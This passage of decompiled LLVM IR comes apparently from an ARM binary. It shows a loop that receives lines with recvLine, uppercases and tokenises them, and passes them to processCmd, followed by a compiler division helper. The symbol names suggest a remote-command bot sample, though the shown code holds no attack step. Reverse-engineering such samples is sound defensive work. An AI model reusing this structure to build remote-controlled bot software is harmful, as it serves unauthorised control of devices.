  %v7_a32c = icmp eq i8 %v2_a328, 32
  br i1 %v7_a32c, label %dec_label_pc_a344, label %dec_label_pc_a334

dec_label_pc_a334:                                ; preds = %dec_label_pc_a324
  %v2_a338 = load i8, i8* %storemerge13, align 1
  %v2_a33c = icmp eq i8 %v2_a338, 0
  br i1 %v2_a33c, label %dec_label_pc_a344, label %dec_label_pc_a324

dec_label_pc_a344:                                ; preds = %dec_label_pc_a334, %dec_label_pc_a324
  %v2_a348 = load i8, i8* %storemerge13, align 1
  %v2_a34c = icmp eq i8 %v2_a348, 0
  br i1 %v2_a34c, label %dec_label_pc_a624, label %dec_label_pc_a354

dec_label_pc_a354:                                ; preds = %dec_label_pc_a344
  store i8 0, i8* %storemerge13, align 1
  %v3_a374 = call i32 @strlen(i8* %v5_a368)
  %v2_a384 = add i32 %v3_a374, %v2_a634
  %v1_a388 = add i32 %v2_a384, 2
  %v5_a38c = inttoptr i32 %v1_a388 to i8*
  %v1_a3bc = add i32 %v2_a384, 1
  br label %dec_label_pc_a3b8

dec_label_pc_a394:                                ; preds = %dec_label_pc_a3e0, %dec_label_pc_a3b8
  %v3_a3a4 = call i32 @strlen(i8* %v5_a38c)
  %v2_a3ac = add i32 %v1_a3bc, %v3_a3a4
  %v3_a3b4 = inttoptr i32 %v2_a3ac to i8*
  store i8 0, i8* %v3_a3b4, align 1
  br label %dec_label_pc_a3b8

dec_label_pc_a3b8:                                ; preds = %dec_label_pc_a354, %dec_label_pc_a394
  %v3_a3c8 = call i32 @strlen(i8* %v5_a38c)
  %v2_a3d0 = add i32 %v1_a3bc, %v3_a3c8
  %v1_a3d4 = inttoptr i32 %v2_a3d0 to i8*
  %v2_a3d4 = load i8, i8* %v1_a3d4, align 1
  %v7_a3d8 = icmp eq i8 %v2_a3d4, 10
  br i1 %v7_a3d8, label %dec_label_pc_a394, label %dec_label_pc_a3e0

dec_label_pc_a3e0:                                ; preds = %dec_label_pc_a3b8
  store i32 %v1_a3bc, i32* @r4, align 4
  %v3_a3f0 = call i32 @strlen(i8* %v5_a38c)
  %v0_a3f8 = load i32, i32* @r4, align 4
  %v2_a3f8 = add i32 %v0_a3f8, %v3_a3f0
  %v1_a3fc = inttoptr i32 %v2_a3f8 to i8*
  %v2_a3fc = load i8, i8* %v1_a3fc, align 1
  %v7_a400 = icmp eq i8 %v2_a3fc, 13
  br i1 %v7_a400, label %dec_label_pc_a394, label %dec_label_pc_a408

dec_label_pc_a408:                                ; preds = %dec_label_pc_a3e0
  %v2_a42424 = load i8, i8* %v5_a38c, align 1
  %v7_a42828 = icmp eq i8 %v2_a42424, 32
  br i1 %v7_a42828, label %dec_label_pc_a440, label %dec_label_pc_a430

dec_label_pc_a414:                                ; preds = %dec_label_pc_a430
  %v1_a418 = add i32 %v4_a42030, 1
  %v5_a41c = inttoptr i32 %v1_a418 to i8*
  %v2_a424 = load i8, i8* %v5_a41c, align 1
  %v7_a428 = icmp eq i8 %v2_a424, 32
  br i1 %v7_a428, label %dec_label_pc_a440, label %dec_label_pc_a430

dec_label_pc_a430:                                ; preds = %dec_label_pc_a408, %dec_label_pc_a414
  %v4_a42030 = phi i32 [ %v1_a418, %dec_label_pc_a414 ], [ %v1_a388, %dec_label_pc_a408 ]
  %stack_var_-60.029 = phi i8* [ %v5_a41c, %dec_label_pc_a414 ], [ %v5_a38c, %dec_label_pc_a408 ]
  %v2_a434 = load i8, i8* %stack_var_-60.029, align 1
  %v2_a438 = icmp eq i8 %v2_a434, 0
  br i1 %v2_a438, label %dec_label_pc_a440, label %dec_label_pc_a414

dec_label_pc_a440:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a430, %dec_label_pc_a408
  %stack_var_-60.0.lcssa = phi i8* [ %v5_a38c, %dec_label_pc_a408 ], [ %v5_a41c, %dec_label_pc_a414 ], [ %stack_var_-60.029, %dec_label_pc_a430 ]
  %v4_a420.lcssa = phi i32 [ %v1_a388, %dec_label_pc_a408 ], [ %v1_a418, %dec_label_pc_a414 ], [ %v4_a42030, %dec_label_pc_a430 ]
  store i8 0, i8* %stack_var_-60.0.lcssa, align 1
  %v1_a450 = add i32 %v4_a420.lcssa, 1
  %v2_a49435 = load i8, i8* %v5_a38c, align 1
  %v2_a49837 = icmp eq i8 %v2_a49435, 0
  br i1 %v2_a49837, label %dec_label_pc_a4a0, label %dec_label_pc_a464

dec_label_pc_a464:                                ; preds = %dec_label_pc_a440, %dec_label_pc_a464
  %storemerge1239 = phi i8* [ %storemerge12, %dec_label_pc_a464 ], [ %v5_a38c, %dec_label_pc_a440 ]
  %storemerge1938 = phi i32 [ %v1_a488, %dec_label_pc_a464 ], [ %v1_a388, %dec_label_pc_a440 ]
  %v2_a468 = load i8, i8* %storemerge1239, align 1
  %v3_a468 = zext i8 %v2_a468 to i32
  %v1_a470 = call i32 @__GI_toupper(i32 %v3_a468)
  %v1_a480 = trunc i32 %v1_a470 to i8
  store i8 %v1_a480, i8* %storemerge1239, align 1
  %v1_a488 = add i32 %storemerge1938, 1
  %storemerge12 = inttoptr i32 %v1_a488 to i8*
  %v2_a494 = load i8, i8* %storemerge12, align 1
  %v2_a498 = icmp eq i8 %v2_a494, 0
  br i1 %v2_a498, label %dec_label_pc_a4a0, label %dec_label_pc_a464

dec_label_pc_a4a0:                                ; preds = %dec_label_pc_a464, %dec_label_pc_a440
  %v2_a4b4 = call i32 @__GI_strtok(i32 %v1_a450, i32 ptrtoint (i32* @global_var_18a50.72 to i32))
  store i32 %v1_a388, i32* %stack_var_-188, align 4
  %v2_a5ac42 = icmp eq i32 %v2_a4b4, 0
  br i1 %v2_a5ac42, label %dec_label_pc_a5b4, label %dec_label_pc_a4cc

dec_label_pc_a4cc:                                ; preds = %dec_label_pc_a4a0, %dec_label_pc_a594
  %stack_var_-32.045.in = phi i32 [ %v2_a59c, %dec_label_pc_a594 ], [ %v2_a4b4, %dec_label_pc_a4a0 ]
  %stack_var_-36.143 = phi i32 [ %stack_var_-36.0, %dec_label_pc_a594 ], [ 1, %dec_label_pc_a4a0 ]
  %stack_var_-32.045 = inttoptr i32 %stack_var_-32.045.in to i8*
  %v2_a4d0 = load i8, i8* %stack_var_-32.045, align 1
  %v7_a4d4 = icmp eq i8 %v2_a4d0, 10
  br i1 %v7_a4d4, label %dec_label_pc_a594, label %dec_label_pc_a4dc

dec_label_pc_a4dc:                                ; preds = %dec_label_pc_a4cc
  store i32 %stack_var_-36.143, i32* @r4, align 4
  %v3_a4e8 = call i32 @strlen(i8* nonnull %stack_var_-32.045)
  %v1_a4f0 = add i32 %v3_a4e8, 1
  %v1_a4f8 = call i32 @malloc(i32 %v1_a4f0)
  %v0_a508 = load i32, i32* @r4, align 4
  %v3_a508 = mul i32 %v0_a508, 4
  %v2_a514 = add i32 %v2_a5f4, %v3_a508
  %v2_a518 = inttoptr i32 %v2_a514 to i32*
  store i32 %v1_a4f8, i32* %v2_a518, align 4
  %v3_a524 = mul i32 %stack_var_-36.143, 4
  %v2_a530 = add i32 %v2_a5f4, %v3_a524
  %v1_a534 = inttoptr i32 %v2_a530 to i32*
  %v2_a534 = load i32, i32* %v1_a534, align 4
  store i32 %v2_a534, i32* @r4, align 4
  %v3_a540 = call i32 @strlen(i8* nonnull %stack_var_-32.045)
  %v1_a548 = add i32 %v3_a540, 1
  %v0_a54c = load i32, i32* @r4, align 4
  %v3_a558 = inttoptr i32 %v0_a54c to i8*
  %v4_a558 = call i32 @__GI_memset(i8* %v3_a558, i32 0, i32 %v1_a548)
  %v2_a574 = load i32, i32* %v1_a534, align 4
  store i32 %stack_var_-32.045.in, i32* @r1, align 4
  %v3_a584 = inttoptr i32 %v2_a574 to i8*
  %v4_a584 = call i32 @strcpy(i8* %v3_a584, i32 %stack_var_-32.045.in)
  %v1_a58c = add i32 %stack_var_-36.143, 1
  br label %dec_label_pc_a594

dec_label_pc_a594:                                ; preds = %dec_label_pc_a4cc, %dec_label_pc_a4dc
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.143, %dec_label_pc_a4cc ], [ %v1_a58c, %dec_label_pc_a4dc ]
  %v2_a59c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_18a50.72 to i32))
  %v2_a5ac = icmp eq i32 %v2_a59c, 0
  br i1 %v2_a5ac, label %dec_label_pc_a5b4, label %dec_label_pc_a4cc

dec_label_pc_a5b4:                                ; preds = %dec_label_pc_a594, %dec_label_pc_a4a0
  %stack_var_-36.1.lcssa = phi i32 [ 1, %dec_label_pc_a4a0 ], [ %stack_var_-36.0, %dec_label_pc_a594 ]
  %v3_a5c0 = call i32 @processCmd(i32 %stack_var_-36.1.lcssa, i32* nonnull %stack_var_-188)
  %v7_a5cc = icmp slt i32 %stack_var_-36.1.lcssa, 2
  br i1 %v7_a5cc, label %dec_label_pc_a624, label %dec_label_pc_a5e4.lr.ph

dec_label_pc_a5e4.lr.ph:                          ; preds = %dec_label_pc_a5b4
  br label %dec_label_pc_a5e4

dec_label_pc_a5e4:                                ; preds = %dec_label_pc_a5e4.lr.ph, %dec_label_pc_a5e4
  %storemerge20113 = phi i32 [ 1, %dec_label_pc_a5e4.lr.ph ], [ %v1_a60c, %dec_label_pc_a5e4 ]
  %v3_a5ec = mul i32 %storemerge20113, 4
  %v2_a5f8 = add i32 %v2_a5f4, %v3_a5ec
  %v1_a5fc = inttoptr i32 %v2_a5f8 to i32*
  %v2_a5fc = load i32, i32* %v1_a5fc, align 4
  store i32 %v2_a5fc, i32* @r0, align 4
  %v0_a604 = call i32 @free()
  %v1_a60c = add nuw nsw i32 %storemerge20113, 1
  %v5_a620 = icmp slt i32 %v1_a60c, %stack_var_-36.1.lcssa
  br i1 %v5_a620, label %dec_label_pc_a5e4, label %dec_label_pc_a624

dec_label_pc_a624:                                ; preds = %dec_label_pc_a5e4, %dec_label_pc_a2b4, %dec_label_pc_a5b4, %dec_label_pc_a344, %dec_label_pc_9fc0
  %v2_a628 = load i32, i32* @global_var_22588.46, align 4
  %v5_a644 = call i32 @recvLine(i32 %v2_a628, i8* %v4_a644, i32 4096, i32 %v2_a634)
  %v3_a654 = icmp eq i32 %v5_a644, -1
  br i1 %v3_a654, label %dec_label_pc_9fb0, label %dec_label_pc_a240

; uselistorder directives
  uselistorder i32 %v5_a644, { 1, 0 }
  uselistorder i32 %stack_var_-36.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_a59c, { 1, 0 }
  uselistorder i8* %stack_var_-32.045, { 2, 1, 0 }
  uselistorder i32 %stack_var_-36.143, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge12, { 1, 0 }
  uselistorder i32 %v1_a488, { 1, 0 }
  uselistorder i8* %storemerge1239, { 1, 0 }
  uselistorder i32 %v1_a3bc, { 2, 1, 0 }
  uselistorder i8* %v5_a38c, { 0, 3, 2, 1, 4, 5, 7, 6 }
  uselistorder i32 %v1_a388, { 3, 0, 2, 1, 4 }
  uselistorder i8* %storemerge13, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_a27c, { 1, 0 }
  uselistorder i32 %v3_a290, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_a1c0, { 1, 0 }
  uselistorder i32 %v3_a1f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a168, { 1, 0 }
  uselistorder i32 %v1_a14c, { 1, 0 }
  uselistorder i32 %v5_a088, { 1, 0 }
  uselistorder i32 %v1_a01c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_a038, { 1, 0 }
  uselistorder i32 %v2_a02c, { 1, 0 }
  uselistorder i32 %v2_a5f4, { 2, 0, 1 }
  uselistorder i8* %v4_a644, { 3, 0, 1, 2 }
  uselistorder i32 %v2_a634, { 3, 0, 1, 2 }
  uselistorder i32 %v2_9e3c, { 0, 1, 3, 2 }
  uselistorder i32 %v2_9dec, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_22588.46, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_22580.48, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_25264.51, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 ()* @__getpid, { 2, 1, 0 }
  uselistorder i32 ()* @rand_next, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @rand_init, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a624, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_a5e4, { 1, 0 }
  uselistorder label %dec_label_pc_a594, { 1, 0 }
  uselistorder label %dec_label_pc_a4cc, { 1, 0 }
  uselistorder label %dec_label_pc_a464, { 1, 0 }
  uselistorder label %dec_label_pc_a440, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a430, { 1, 0 }
  uselistorder label %dec_label_pc_a3b8, { 1, 0 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
  uselistorder label %dec_label_pc_a2b4, { 1, 0 }
  uselistorder label %dec_label_pc_a234, { 1, 0 }
  uselistorder label %dec_label_pc_a1a4, { 1, 0 }
  uselistorder label %dec_label_pc_a06c, { 1, 0 }
  uselistorder label %dec_label_pc_9fb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9f9c, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_a678 = load i32, i32* @r1, align 4
  %v1_a678 = add i32 %v0_a678, -1
  store i32 %v1_a678, i32* %r2.global-to-local, align 4
  %v2_a678 = icmp eq i32 %v0_a678, 0
  %v7_a678 = icmp eq i32 %v0_a678, 1
  %v0_a67c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_a678, i32 %v0_a67c)
  br i1 %v2_a678, label %dec_label_pc_a760, label %dec_label_pc_a684

dec_label_pc_a684:                                ; preds = %entry
  %v0_a684 = load i32, i32* %r0.global-to-local, align 4
  %v1_a684 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_a684, %v1_a684
  br i1 %tmp, label %dec_label_pc_a68c, label %dec_label_pc_a718

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a684
  %v1_a68c = load i32, i32* %r2.global-to-local, align 4
  %v2_a68c = and i32 %v1_a68c, %v1_a684
  %v4_a68c = icmp eq i32 %v2_a68c, 0
  br i1 %v4_a68c, label %dec_label_pc_a724, label %dec_label_pc_a694

dec_label_pc_a694:                                ; preds = %dec_label_pc_a68c
  %v3_a694 = icmp ult i32 %v1_a684, 536870912
  br i1 %v3_a694, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_a694
  %v4_a698 = mul i32 %v1_a684, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_a694, %.thread
  %v0_a6b8.pr36.ph = phi i32 [ %v4_a698, %.thread ], [ %v1_a684, %dec_label_pc_a694 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_a694 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_a6b8.pr36 = phi i32 [ %v4_a6ac, %bb81 ], [ %v0_a6b8.pr36.ph, %.preheader.preheader ]
  %v1_a6b0 = phi i32 [ %v4_a6b0, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_a6a4 = icmp ugt i32 %v0_a6b8.pr36, 268435455
  br i1 %v2_a6a4, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_a6b8thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_a6a8 = icmp ult i32 %v0_a6b8.pr36, %v0_a684
  br i1 %v4_a6a8, label %bb80, label %dec_label_pc_a6b8thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_a6ac = and i32 %v0_a6b8.pr36, 268435456
  %v3_a6ac = icmp eq i32 %v2_a6ac, 0
  %v4_a6ac = mul i32 %v0_a6b8.pr36, 16
  br i1 %v3_a6ac, label %bb81, label %dec_label_pc_a6b8.loopexit

bb81:                                             ; preds = %bb80
  %v2_a6b0 = and i32 %v1_a6b0, 268435456
  %v3_a6b0 = icmp eq i32 %v2_a6b0, 0
  %v4_a6b0 = mul i32 %v1_a6b0, 16
  br i1 %v3_a6b0, label %.preheader, label %dec_label_pc_a6b8thread-pre-split.loopexit.loopexit

dec_label_pc_a6b8thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_a6c448.ph = phi i32 [ %v1_a6b0, %bb ], [ %v4_a6b0, %bb81 ]
  %v0_a6b8.pr38.ph = phi i32 [ %v0_a6b8.pr36, %bb ], [ %v4_a6ac, %bb81 ]
  br label %dec_label_pc_a6b8thread-pre-split.loopexit

dec_label_pc_a6b8thread-pre-split.loopexit:       ; preds = %dec_label_pc_a6b8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_a6c448 = phi i32 [ %v1_a6b0, %.thread2 ], [ %v1_a6c448.ph, %dec_label_pc_a6b8thread-pre-split.loopexit.loopexit ]
  %v0_a6b8.pr38 = phi i32 [ %v0_a6b8.pr36, %.thread2 ], [ %v0_a6b8.pr38.ph, %dec_label_pc_a6b8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_a6b8thread-pre-split

dec_label_pc_a6b8thread-pre-split:                ; preds = %dec_label_pc_a6b8thread-pre-split.loopexit, %bb83
  %v1_a6c446 = phi i32 [ %v1_a6c448, %dec_label_pc_a6b8thread-pre-split.loopexit ], [ %v3_a6c4, %bb83 ]
  %v0_a6b8.pr = phi i32 [ %v0_a6b8.pr38, %dec_label_pc_a6b8thread-pre-split.loopexit ], [ %v3_a6c0, %bb83 ]
  br label %dec_label_pc_a6b8

dec_label_pc_a6b8.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_a6b8

dec_label_pc_a6b8:                                ; preds = %dec_label_pc_a6b8.loopexit, %dec_label_pc_a6b8thread-pre-split
  %v1_a6c4 = phi i32 [ %v1_a6c446, %dec_label_pc_a6b8thread-pre-split ], [ %v1_a6b0, %dec_label_pc_a6b8.loopexit ]
  %v1_a6c0 = phi i32 [ %v0_a6b8.pr, %dec_label_pc_a6b8thread-pre-split ], [ %v4_a6ac, %dec_label_pc_a6b8.loopexit ]
  %v2_a6b8 = icmp slt i32 %v1_a6c0, 0
  br i1 %v2_a6b8, label %dec_label_pc_a6cc, label %bb82

bb82:                                             ; preds = %dec_label_pc_a6b8
  %v4_a6bc = icmp ult i32 %v1_a6c0, %v0_a684
  br i1 %v4_a6bc, label %bb83, label %dec_label_pc_a6cc

bb83:                                             ; preds = %bb82
  %v3_a6c0 = mul i32 %v1_a6c0, 2
  %v2_a6c4 = icmp slt i32 %v1_a6c4, 0
  %v3_a6c4 = mul i32 %v1_a6c4, 2
  br i1 %v2_a6c4, label %dec_label_pc_a6cc, label %dec_label_pc_a6b8thread-pre-split

dec_label_pc_a6cc:                                ; preds = %bb82, %dec_label_pc_a6b8, %bb83
  %v2_a6d859 = phi i32 [ %v3_a6c4, %bb83 ], [ %v1_a6c4, %bb82 ], [ %v1_a6c4, %dec_label_pc_a6b8 ]
  %v1_a6d051 = phi i32 [ %v3_a6c0, %bb83 ], [ %v1_a6c0, %bb82 ], [ %v1_a6c0, %dec_label_pc_a6b8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %.thread11, %dec_label_pc_a6cc
  %v1_a704 = phi i32 [ %v4_a704, %.thread11 ], [ %v2_a6d859, %dec_label_pc_a6cc ]
  %v1_a6d8 = phi i32 [ %v0_a710, %.thread11 ], [ 0, %dec_label_pc_a6cc ]
  %v1_a708 = phi i32 [ %v4_a708, %.thread11 ], [ %v1_a6d051, %dec_label_pc_a6cc ]
  %v1_a6d4 = phi i32 [ %v0_a700, %.thread11 ], [ %v0_a684, %dec_label_pc_a6cc ]
  %v3_a6d0 = icmp ult i32 %v1_a6d4, %v1_a708
  br i1 %v3_a6d0, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_a6d0
  %v3_a6d4 = sub i32 %v1_a6d4, %v1_a708
  store i32 %v3_a6d4, i32* %r0.global-to-local, align 4
  %v3_a6d8 = or i32 %v1_a6d8, %v1_a704
  store i32 %v3_a6d8, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_a6d0, %bb84
  %v1_a6e0 = phi i32 [ %v1_a6d4, %dec_label_pc_a6d0 ], [ %v3_a6d4, %bb84 ]
  %v1_a6e4 = phi i32 [ %v1_a6d8, %dec_label_pc_a6d0 ], [ %v3_a6d8, %bb84 ]
  %v4_a6dc = udiv i32 %v1_a708, 2
  %v6_a6dc = icmp ult i32 %v1_a6e0, %v4_a6dc
  br i1 %v6_a6dc, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_a6e0 = urem i32 %v1_a708, 2
  %v4_a6e0 = icmp eq i32 %v3_a6e0, 0
  %v6_a6e0 = sub i32 %v1_a6e0, %v4_a6dc
  store i32 %v6_a6e0, i32* %r0.global-to-local, align 4
  br i1 %v4_a6e0, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_a6e4 = udiv i32 %v1_a704, 2
  %v6_a6e4 = or i32 %v1_a6e4, %v5_a6e4
  store i32 %v6_a6e4, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_a6ec = phi i32 [ %v6_a6e0, %bb85 ], [ %v1_a6e0, %.thread7 ], [ %v6_a6e0, %bb86 ]
  %v1_a6f0 = phi i32 [ %v1_a6e4, %bb85 ], [ %v1_a6e4, %.thread7 ], [ %v6_a6e4, %bb86 ]
  %v4_a6e8 = udiv i32 %v1_a708, 4
  %v6_a6e8 = icmp ult i32 %v1_a6ec, %v4_a6e8
  br i1 %v6_a6e8, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_a6ec = and i32 %v1_a708, 2
  %v4_a6ec = icmp eq i32 %v3_a6ec, 0
  %v6_a6ec = sub i32 %v1_a6ec, %v4_a6e8
  store i32 %v6_a6ec, i32* %r0.global-to-local, align 4
  br i1 %v4_a6ec, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_a6f0 = udiv i32 %v1_a704, 4
  %v6_a6f0 = or i32 %v1_a6f0, %v5_a6f0
  store i32 %v6_a6f0, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_a6f8 = phi i32 [ %v6_a6ec, %bb87 ], [ %v1_a6ec, %.thread8 ], [ %v6_a6ec, %bb88 ]
  %v1_a6fc = phi i32 [ %v1_a6f0, %bb87 ], [ %v1_a6f0, %.thread8 ], [ %v6_a6f0, %bb88 ]
  %v4_a6f4 = udiv i32 %v1_a708, 8
  %v6_a6f4 = icmp ult i32 %v1_a6f8, %v4_a6f4
  br i1 %v6_a6f4, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_a6f8 = and i32 %v1_a708, 4
  %v4_a6f8 = icmp eq i32 %v3_a6f8, 0
  %v6_a6f8 = sub i32 %v1_a6f8, %v4_a6f4
  store i32 %v6_a6f8, i32* %r0.global-to-local, align 4
  br i1 %v4_a6f8, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_a6fc = udiv i32 %v1_a704, 8
  %v6_a6fc = or i32 %v1_a6fc, %v5_a6fc
  store i32 %v6_a6fc, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_a710 = phi i32 [ %v1_a6fc, %bb89 ], [ %v1_a6fc, %.thread9 ], [ %v6_a6fc, %bb90 ]
  %v0_a700 = phi i32 [ %v6_a6f8, %bb89 ], [ %v1_a6f8, %.thread9 ], [ %v6_a6f8, %bb90 ]
  %v2_a700 = icmp eq i32 %v0_a700, 0
  br i1 %v2_a700, label %dec_label_pc_a710, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_a704, 16
  br i1 %tmp138, label %dec_label_pc_a710, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_a704 = udiv i32 %v1_a704, 16
  %v4_a708 = udiv i32 %v1_a708, 16
  br label %dec_label_pc_a6d0

dec_label_pc_a710:                                ; preds = %thread-pre-split, %bb91
  store i32 %v0_a710, i32* %r0.global-to-local, align 4
  ret i32 %v0_a710

dec_label_pc_a718:                                ; preds = %dec_label_pc_a684
  %v9_a684 = icmp eq i32 %v0_a684, %v1_a684
  %. = zext i1 %v9_a684 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_a724:                                ; preds = %dec_label_pc_a68c
  %v2_a724 = icmp ugt i32 %v1_a684, 65535
  br i1 %v2_a724, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_a724
  %v2_a728 = and i32 %v1_a684, 32768
  %v3_a728 = icmp eq i32 %v2_a728, 0
  %v4_a728 = udiv i32 %v1_a684, 65536
  br i1 %v3_a728, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_a724
  %v0_a73465 = phi i32 [ %v1_a684, %dec_label_pc_a724 ], [ %v4_a728, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_a738 = phi i32 [ %v0_a73465, %.thread16 ], [ %v4_a728, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_a734 = icmp ugt i32 %v1_a738, 255
  br i1 %v2_a734, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_a738 = and i32 %v1_a738, 128
  %v3_a738 = icmp eq i32 %v2_a738, 0
  %v4_a738 = udiv i32 %v1_a738, 256
  br i1 %v3_a738, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_a73c = or i32 %storemerge, 8
  store i32 %v2_a73c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_a748 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_a73c, %bb98 ]
  %v1_a744 = phi i32 [ %v1_a738, %bb96 ], [ %v4_a738, %bb97 ], [ %v4_a738, %bb98 ]
  %v2_a740 = icmp ugt i32 %v1_a744, 15
  br i1 %v2_a740, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_a744 = and i32 %v1_a744, 8
  %v3_a744 = icmp eq i32 %v2_a744, 0
  %v4_a744 = udiv i32 %v1_a744, 16
  br i1 %v3_a744, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_a748 = add nsw i32 %v1_a748, 4
  store i32 %v2_a748, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_a750 = phi i32 [ %v1_a748, %.thread17 ], [ %v1_a748, %bb99 ], [ %v2_a748, %bb100 ]
  %v5_a754 = phi i32 [ %v1_a744, %.thread17 ], [ %v4_a744, %bb99 ], [ %v4_a744, %bb100 ]
  %v2_a74c = icmp ugt i32 %v5_a754, 3
  %v7_a74c = icmp eq i32 %v5_a754, 4
  %v2_a750 = xor i1 %v7_a74c, true
  %v3_a750 = and i1 %v2_a74c, %v2_a750
  br i1 %v3_a750, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_a750 = add nsw i32 %v4_a750, 3
  store i32 %v5_a750, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_a754 = phi i32 [ %v4_a750, %.thread18 ], [ %v5_a750, %bb101 ]
  %v2_a754 = xor i1 %v2_a74c, true
  %v3_a754 = or i1 %v7_a74c, %v2_a754
  br i1 %v3_a754, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_a754 = udiv i32 %v5_a754, 2
  %v9_a754 = add i32 %v4_a754, %v8_a754
  store i32 %v9_a754, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_a758 = phi i32 [ %v4_a754, %bb102 ], [ %v9_a754, %bb103 ]
  %v6_a758 = lshr i32 %v0_a684, %v1_a758
  store i32 %v6_a758, i32* %r0.global-to-local, align 4
  ret i32 %v6_a758

dec_label_pc_a760:                                ; preds = %entry
  %v0_a764 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_a754, { 1, 0 }
  uselistorder i1 %v7_a74c, { 1, 0 }
  uselistorder i32 %v4_a744, { 1, 0 }
  uselistorder i32 %v1_a744, { 1, 0, 2, 3 }
  uselistorder i32 %v2_a73c, { 1, 0 }
  uselistorder i32 %v4_a738, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a738, { 1, 0, 2, 3 }
  uselistorder i32 %v4_a728, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_a700, { 1, 0 }
  uselistorder i32 %v0_a710, { 1, 0, 2 }
  uselistorder i32 %v4_a6f4, { 1, 0 }
